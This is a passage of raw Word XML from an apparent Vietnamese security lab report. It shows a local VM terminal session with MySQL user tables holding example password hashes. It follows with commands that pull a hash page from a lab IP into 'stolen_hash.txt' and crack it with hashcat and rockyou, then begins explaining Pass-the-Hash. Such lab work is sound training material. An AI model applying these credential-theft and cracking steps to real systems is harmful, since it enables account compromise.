          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t>qtm-khuong@qtmkhuong-virtual-machine:~$ sudo nano /var/www/html/register.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2343A7E9">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t>qtm-khuong@qtmkhuong-virtual-machine:~$ sudo nano /var/www/html/register.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="068A7102">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t>qtm-khuong@qtmkhuong-virtual-machine:~$ sudo nano /var/www/html/users.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="174F71E9">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t>qtm-khuong@qtmkhuong-virtual-machine:~$ sudo mysql -u root -p</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7730C750">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t xml:space="preserve">[sudo] password for qtm-khuong: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AF6B16A">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t xml:space="preserve">Enter password: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B4EE482">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t>Welcome to the MySQL monitor.  Commands end with ; or \g.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3983F42F">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t>Your MySQL connection id is 15</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AB8D38B">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t>Server version: 8.0.43-0ubuntu0.22.04.1 (Ubuntu)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FD42980">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="37BFB3B5">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t>Copyright (c) 2000, 2025, Oracle and/or its affiliates.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DC161BD">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1F6EE579">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t>Oracle is a registered trademark of Oracle Corporation and/or its</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CE80931">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t>affiliates. Other names may be trademarks of their respective</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E9A7A4E">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t>owners.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CB9E8BF">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5B72EC2F">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t>Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18A9A6D1">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3ABBE7BD">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t>mysql&gt; USE testapp;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="299F02E3">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t>Reading table information for completion of table and column names</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B695F12">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t>You can turn off this feature to get a quicker startup with -A</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BF03AF5">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="128180D1">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t>Database changed</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="606C7114">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t>mysql&gt; SELECT * FROM users;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18936E39">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t>Empty set (0,00 sec)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AF5C2F6">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1135AE2D">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t>mysql&gt; SELECT * FROM users;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77EA5213">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t>+----+-------------+------------------+--------------------------------------------------------------+</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D8C90D8">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t>| id | username    | email            | password_hash                                                |</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78F3711E">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t>+----+-------------+------------------+--------------------------------------------------------------+</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FAEC841">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t>|  1 | victim_user | user@example.com | $2y$10$eW5akwBK16TYGTY850C.fuZBaBd23Rh7QprMmf8D1iONYg9jY7i7K |</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="482FEB83">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t>+----+-------------+------------------+--------------------------------------------------------------+</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05F6A5E1">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t>1 row in set (0,01 sec)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19616BB2">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4204B71B">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t>mysql&gt; SELECT * FROM users;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5665C2DA">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t>+----+-------------+-------------------+--------------------------------------------------------------+</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DEDB0BC">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t>| id | username    | email             | password_hash                                                |</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0691CA90">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t>+----+-------------+-------------------+--------------------------------------------------------------+</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57D1D9AC">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t>|  1 | victim_user | user@example.com  | $2y$10$eW5akwBK16TYGTY850C.fuZBaBd23Rh7QprMmf8D1iONYg9jY7i7K |</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6956FDDB">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t>|  2 | user1       | user1@example.com | 482c811da5d5b4bc6d497ffa98491e38                             |</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="106CEBAA">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t>+----+-------------+-------------------+--------------------------------------------------------------+</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AD60832">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t>2 rows in set (0,00 sec)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BE8BF5E">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6F9EC92C">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t>mysql&gt; DELETE FROM users WHERE id = 1;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58364C00">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t>Query OK, 1 row affected (0,02 sec)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="562594AD">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2E736F2D">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t>mysql&gt; SELECT * FROM users;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="685D991F">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t>+----+----------+-------------------+----------------------------------+</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FE28A8D">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t>| id | username | email             | password_hash                    |</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AFCE627">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t>+----+----------+-------------------+----------------------------------+</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="340A288E">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t>|  2 | user1    | user1@example.com | 482c811da5d5b4bc6d497ffa98491e38 |</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77A68850">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t>+----+----------+-------------------+----------------------------------+</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C590717">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t>1 row in set (0,00 sec)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A02F344">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="263DAE13">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t xml:space="preserve">mysql&gt; </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="766363AD">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t>curl http://192.168.8.129/users.php -o stolen_hash.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B3FF2D8">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t>cut -d: -f3 stolen_hashes.txt &gt; hash_for_cracking.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66A29288">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t>hashcat -m 0 -a 0 -o cracked_passwords.txt hash_for_cracking.txt /usr/share/wordlists/rockyou.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CF45F96">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t>python3 crack_md5.py 482c811da5d5b4bc6d497ffa98491e38 /usr/share/wordlists/rockyou.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C6D37F6">
      <w:pPr>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:suppressLineNumbers w:val="0"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:beforeLines="0" w:beforeAutospacing="0"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7EE9F5D6">
      <w:pPr>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:suppressLineNumbers w:val="0"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:beforeLines="0" w:beforeAutospacing="0"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="SimSun" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t xml:space="preserve">PHẦN </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="SimSun" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>PRIVILEGE ESCALATION (VERTICAL)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75D74702">
      <w:pPr>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:suppressLineNumbers w:val="0"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:beforeLines="0" w:beforeAutospacing="0"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="SimSun" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="494F6611">
      <w:pPr>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:suppressLineNumbers w:val="0"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:beforeLines="0" w:beforeAutospacing="0" w:afterAutospacing="0"/>
        <w:jc w:val="left"/>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4 ORTHER</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34430AB1">
      <w:pPr>
        <w:pStyle w:val="2"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:suppressLineNumbers w:val="0"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">Tấn công </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="92"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>Pass-the-Hash (PtH)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30F3041C">
      <w:pPr>
        <w:pStyle w:val="3"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:suppressLineNumbers w:val="0"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>1. Khái niệm</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C9E12CC">
      <w:pPr>
        <w:pStyle w:val="85"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:suppressLineNumbers w:val="0"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:ind w:left="136" w:leftChars="68" w:firstLine="0" w:firstLineChars="0"/>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="92"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>Pass-the-Hash</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> là kỹ thuật tấn công trong </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="92"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>Windows Authentication</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">, khi kẻ tấn công không cần biết </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="92"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>mật khẩu gốc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">, mà chỉ cần có </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="92"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>hash NTLM</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
